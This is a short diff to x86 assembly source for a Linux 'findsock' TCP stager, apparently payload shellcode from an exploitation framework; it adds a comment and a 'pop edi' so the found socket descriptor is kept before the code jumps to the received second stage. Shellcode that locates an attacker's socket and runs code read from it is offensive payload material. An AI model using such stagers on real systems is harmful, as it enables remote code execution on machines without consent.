@@ -15,6 +15,8 @@
 ;
 ;        Implementation of a Linux findsock TCP stager.
 ;
+;        File descriptor in edi
+;
 ;;
 BITS   32
 GLOBAL _start
@@ -40,6 +42,7 @@ findtag:
 	int  0x80
 	cmp  dword [esi], 0x2166736d
 	jnz  findtag
+	pop  edi
 	cld
 	lodsd
 	jmp  esi
